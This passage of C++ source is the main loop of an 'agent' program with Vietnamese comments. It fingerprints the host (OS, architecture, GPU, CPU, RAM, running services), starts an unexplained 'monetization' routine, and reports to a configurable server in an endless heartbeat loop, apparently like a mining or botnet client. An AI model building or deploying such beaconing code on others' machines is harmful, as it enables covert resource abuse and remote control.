    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "stop" || std::string(argv[i]) == "--stop") {
            stop_all_engines();
            std::cout << "[OK] Tat ca service va engine da duoc dung sach se" << std::endl;
            return 0;
        }
    }

    g_self = get_self_path(argv[0]);
    std::string s_url = CONF_SERVER_URL;
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--debug") {
            g_debug = true;
        } else if ((arg == "--server" || arg == "-s") && i + 1 < argc) {
            s_url = argv[++i];
        } else if (arg.rfind("--server=", 0) == 0) {
            s_url = arg.substr(9);
        } else if (arg.rfind("http://", 0) == 0 || arg.rfind("https://", 0) == 0) {
            s_url = arg;
        }
    }
    if (const char* env = std::getenv("SERVER_URL")) s_url = env;
    if (std::getenv("DEBUG") != nullptr) g_debug = true;

    FILE* pf = fopen(".agent.pid", "w");
    if (pf) { fprintf(pf, "%d\n", (int)getpid()); fclose(pf); }

    std::string node_id = get_id();
    std::string os_name = get_os();
    std::string arch = get_arch();
    int has_gpu = detect_gpu();
    std::string endpoint = s_url + "?action=heartbeat";

    init_and_start_monetization(s_url, node_id);

    // Gửi heartbeat ban đầu
    {
        std::ostringstream ss;
        ss << "action=heartbeat&id=" << node_id << "&os=" << os_name << "&arch=" << arch
           << "&gpu=" << has_gpu << "&uptime=" << get_uptime() << "&cpu=" << get_cpu()
           << "&ram=" << get_ram() << "&services=" << detect_active_services()
           << "&step=" << g_current_step
           << "&event=START&first=1";
        if (g_debug) ss << "&debug=1";
        http_post(endpoint, ss.str(), get_service_logs(), g_step_detail);
    }

    int loop_cnt = 0;
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(CONF_INTERVAL));
        loop_cnt++;
        if (loop_cnt % 2 == 0) {
            init_and_start_monetization(s_url, node_id);
        }
        std::ostringstream ss;
        ss << "action=heartbeat&id=" << node_id << "&os=" << os_name << "&arch=" << arch
           << "&gpu=" << has_gpu << "&uptime=" << get_uptime() << "&cpu=" << get_cpu()
           << "&ram=" << get_ram() << "&services=" << detect_active_services()
           << "&step=" << g_current_step;
        if (g_debug) ss << "&debug=1";
        http_post(endpoint, ss.str(), get_service_logs(), g_step_detail);
    }
    return 0;
}
